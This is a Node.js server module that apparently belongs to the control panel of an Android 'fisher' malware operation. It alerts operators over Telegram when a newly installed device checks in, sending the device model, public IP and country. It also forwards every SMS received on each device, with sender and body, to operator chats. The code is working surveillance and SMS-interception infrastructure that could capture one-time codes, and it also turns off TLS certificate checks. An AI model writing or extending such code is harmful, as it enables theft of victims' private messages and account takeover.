'use strict';

const https = require('https');
const http = require('http');
const { URL } = require('url');
const { getPool } = require('./commandPoller');

// 按 userId 缓存配置
const _configCacheMap = new Map();
const _pendingOnlineNotifications = new Map();
const CONFIG_CACHE_TTL = 30000; // 30秒缓存

/**
 * 从数据库读取指定用户的 Telegram 配置
 * @param {number} userId
 */
async function getTelegramConfigForUser(userId) {
  const cacheKey = String(userId);
  const cached = _configCacheMap.get(cacheKey);
  if (cached && (Date.now() - cached.time) < CONFIG_CACHE_TTL) {
    return cached.config;
  }

  try {
    const db = getPool();
    const prefix = `tg_${userId}_`;
    const [rows] = await db.query(
      "SELECT `key`, `value` FROM fisher_settings WHERE `key` LIKE ?",
      [prefix + '%']
    );

    const config = { bot_token: '', chat_id: '', api_proxy: '', notify_online: true, notify_sms: true };

    for (const row of rows) {
      const field = row.key.replace(prefix, '');
      if (field === 'bot_token') config.bot_token = row.value || '';
      else if (field === 'chat_id') config.chat_id = row.value || '';
      else if (field === 'api_proxy') config.api_proxy = row.value || '';
      else if (field === 'notify_online') config.notify_online = row.value !== 'false' && row.value !== '0';
      else if (field === 'notify_sms') config.notify_sms = row.value !== 'false' && row.value !== '0';
    }

    _configCacheMap.set(cacheKey, { config, time: Date.now() });
    return config;
  } catch (err) {
    console.error('[Telegram] 读取配置失败:', err.message);
    return { bot_token: '', chat_id: '', api_proxy: '', notify_online: false, notify_sms: false };
  }
}

/**
 * 通过设备 owner_username 找到对应的 userId，获取其 Telegram 配置
 * 如果设备没有 owner，则通知所有配置了 Telegram 的用户
 */
async function getTelegramConfigForDevice(deviceId) {
  try {
    const db = getPool();
    // 查设备的 owner
    const [devRows] = await db.query('SELECT owner_username FROM fisher_devices WHERE device_id=?', [deviceId]);
    const ownerUsername = devRows[0]?.owner_username || '';

    if (ownerUsername) {
      // 找 owner 的 user_id
      const [userRows] = await db.query('SELECT id FROM fisher_users WHERE username=?', [ownerUsername]);
      if (userRows.length > 0) {
        return [await getTelegramConfigForUser(userRows[0].id)];
      }
    }

    // 没有 owner 或找不到用户 → 通知所有有配置的用户（查所有 tg_%_bot_token）
    const [allTokens] = await db.query("SELECT `key` FROM fisher_settings WHERE `key` LIKE 'tg_%_bot_token' AND `value` != ''");
    const configs = [];
    for (const row of allTokens) {
      const match = row.key.match(/^tg_(\d+)_bot_token$/);
      if (match) {
        configs.push(await getTelegramConfigForUser(Number(match[1])));
      }
    }
    return configs;
  } catch (err) {
    console.error('[Telegram] getTelegramConfigForDevice error:', err.message);
    return [];
  }
}

// 兼容旧调用
async function getTelegramConfig() {
  // fallback：查所有有配置的用户中第一个
  try {
    const db = getPool();
    const [rows] = await db.query("SELECT `key` FROM fisher_settings WHERE `key` LIKE 'tg_%_bot_token' AND `value` != '' LIMIT 1");
    if (rows.length > 0) {
      const match = rows[0].key.match(/^tg_(\d+)_bot_token$/);
      if (match) return getTelegramConfigForUser(Number(match[1]));
    }
  } catch {}
  return { bot_token: '', chat_id: '', api_proxy: '', notify_online: false, notify_sms: false };
}

/**
 * 清除配置缓存（设置更新时调用）
 */
function clearConfigCache() {
  _configCacheMap.clear();
}

/**
 * 发送 Telegram 消息（异步，不阻塞调用方）
 * @param {string} message - HTML 格式的消息内容
 * @param {object} [config] - 可选指定配置，不传则自动查
 */
function sendTelegramNotification(message, config) {
  // fire-and-forget，不阻塞
  _doSend(message, config).then(result => {
    console.log('[Telegram] 消息发送成功:', (result || '').substring(0, 100));
  }).catch(err => {
    console.error('[Telegram] 通知发送失败:', err.message);
  });
}

/**
 * 实际发送逻辑
 */
async function _doSend(message, config) {
  if (!config) {
    config = await getTelegramConfig();
  }
  if (!config.bot_token || !config.chat_id) {
    console.log('[Telegram] _doSend: no bot_token or chat_id, skip');
    return; // 未配置，静默跳过
  }

  const apiUrl = config.api_proxy
    ? `${config.api_proxy.replace(/\/$/, '')}/bot${config.bot_token}/sendMessage`
    : `https://api.telegram.org/bot${config.bot_token}/sendMessage`;

  console.log(`[Telegram] _doSend: url=${apiUrl.replace(/bot[^/]+/, 'bot***')}, chat_id=${config.chat_id}`);

  const payload = JSON.stringify({
    chat_id: config.chat_id,
    text: message,
    parse_mode: 'HTML',
  });

  return new Promise((resolve, reject) => {
    const parsed = new URL(apiUrl);
    const isHttps = parsed.protocol === 'https:';
    const lib = isHttps ? https : http;

    const options = {
      hostname: parsed.hostname,
      port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
      timeout: 15000,
      rejectUnauthorized: false,
    };

    const req = lib.request(options, (res) => {
      let body = '';
      res.on('data', chunk => { body += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          resolve(body);
        } else {
          reject(new Error(`HTTP ${res.statusCode}: ${body.substring(0, 200)}`));
        }
      });
    });

    req.on('error', (err) => {
      console.error(`[Telegram] Request error: ${err.message}`);
      reject(err);
    });
    req.on('timeout', () => {
      console.error('[Telegram] Request timeout (15s)');
      req.destroy();
      reject(new Error('Request timeout'));
    });

    req.write(payload);
    req.end();
  });
}

/**
 * 设备上线通知
 * @param {string} deviceId
 * @param {object} data - 设备信息
 */
function notifyDeviceOnline(deviceId, data) {
  const pending = _pendingOnlineNotifications.get(deviceId);
  if (pending) return pending;

  // 延迟发送，等待设备状态和异步地理位置写入数据库。
  console.log(`[Telegram] notifyDeviceOnline called for device: ${deviceId}`);
  const task = new Promise(resolve => {
    const timer = setTimeout(async () => {
      try {
      const db = getPool();
      const [deviceRows] = await db.query('SELECT * FROM fisher_devices WHERE device_id=?', [deviceId]);
      if (!deviceRows.length || Number(deviceRows[0].tg_notified || 0) === 1) return;

      let row = deviceRows[0];
      if (!row.owner_username && row.app_name) {
        const [owners] = await db.query(
          'SELECT owner_username FROM fisher_app_owner_map WHERE app_name=? LIMIT 1',
          [row.app_name]
        );
        if (owners[0]?.owner_username) {
          await db.query('UPDATE fisher_devices SET owner_username=? WHERE device_id=?', [owners[0].owner_username, deviceId]);
          row = { ...row, owner_username: owners[0].owner_username };
        }
      }

      const configs = await getTelegramConfigForDevice(deviceId);
      console.log(`[Telegram] configs for ${deviceId}: count=${configs.length}, configs=${JSON.stringify(configs.map(c => ({ has_token: !!c.bot_token, has_chat: !!c.chat_id, notify_online: c.notify_online })))}`);
      if (!configs.length) {
        console.log(`[Telegram] No TG configs found for device ${deviceId}, skipping notification`);
        return;
      }

      const [claim] = await db.query(
        'UPDATE fisher_devices SET tg_notified=1 WHERE device_id=? AND COALESCE(tg_notified,0)=0',
        [deviceId]
      );
      if (!claim.affectedRows) return;

      // 从数据库读取最新的设备信息（status 消息可能已更新）
      let info = data || {};
      try {
        const [rows] = await db.query('SELECT * FROM fisher_devices WHERE device_id=?', [deviceId]);
        if (rows.length > 0) {
          const row = rows[0];
          info = {
            brand: row.brand || info.brand || '',
            model: row.model || info.model || '',
            osVersion: row.os_version || info.osVersion || '',
            publicIP: row.public_ip || info.publicIP || info.public_ip || '',
            appName: row.app_name || info.appName || '',
            geoLocation: row.geo_location || '',
          };
        }
      } catch (dbErr) {
        console.error(`[Telegram] DB error reading device info: ${dbErr.message}`);
      }

      const brand = (info.brand || '').toUpperCase();
      const deviceName = brand && deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
      const model = info.model || '';
      const osVersion = info.osVersion || info.os_version || '';
      const ip = info.publicIP || info.public_ip || '';
      const appName = info.appName || info.app_name || '';
      const geo = info.geoLocation || '';
      const now = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

      const msg = [
        `🆕 <b>新设备上线</b>`,
        `━━━━━━━━━━━━━━━`,
        `📱 设备名称: <b>${deviceName}</b>`,
        `📋 型号: ${model}`,
        `🌐 IP: ${ip}`,
        `🤖 系统: Android ${osVersion}`,
        `📦 版本: ${appName}`,
        geo ? `🌍 国家: ${geo}` : '',
        `⏰ 安装时间: ${now}`,
      ].filter(Boolean).join('\n');

      const sends = [];
      for (const config of configs) {
        if (config.notify_online && config.bot_token && config.chat_id) {
          console.log(`[Telegram] Sending online notification for ${deviceId} to chat ${config.chat_id}`);
          sends.push(_doSend(msg, config));
        } else {
          console.log(`[Telegram] Skipping config: notify_online=${config.notify_online}, has_token=${!!config.bot_token}, has_chat=${!!config.chat_id}`);
        }
      }
      const results = await Promise.allSettled(sends);
      const sent = results.filter(result => result.status === 'fulfilled').length;
      if (sent === 0) {
        await db.query('UPDATE fisher_devices SET tg_notified=0 WHERE device_id=?', [deviceId]);
      }
      console.log(`[Telegram] notifyDeviceOnline done for ${deviceId}, sent=${sent}`);
      } catch (err) {
        console.error('[Telegram] notifyDeviceOnline error:', err.message, err.stack);
      } finally {
        if (_pendingOnlineNotifications.get(deviceId) === task) {
          _pendingOnlineNotifications.delete(deviceId);
        }
        resolve();
      }
    }, 5000);
    timer.unref?.();
  });
  _pendingOnlineNotifications.set(deviceId, task);
  return task;
}

/**
 * 新短信通知
 * @param {string} deviceId
 * @param {object} smsData - 短信内容 {sender, body, timestamp, ...}
 */
async function notifyNewSms(deviceId, smsData) {
  try {
    const configs = await getTelegramConfigForDevice(deviceId);

    smsData = smsData || {};
    const sender = smsData.sender || smsData.address || smsData.from || '未知';
    const body = smsData.body || smsData.content || smsData.message || '';
    const now = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

    const msg = [
      `📩 <b>新短信</b>`,
      `━━━━━━━━━━━━━━━`,
      `📱 设备: <code>${deviceId}</code>`,
      `👤 发送者: ${sender}`,
      `💬 内容: ${body.substring(0, 500)}`,
      `⏰ 时间: ${now}`,
    ].join('\n');

    for (const config of configs) {
      if (config.notify_sms && config.bot_token && config.chat_id) {
        sendTelegramNotification(msg, config);
      }
    }
  } catch (err) {
    console.error('[Telegram] notifyNewSms error:', err.message);
  }
}

module.exports = {
  getTelegramConfig,
  clearConfigCache,
  sendTelegramNotification,
  notifyDeviceOnline,
  notifyNewSms,
  _test: {
    pendingOnlineNotifications: _pendingOnlineNotifications,
  },
};
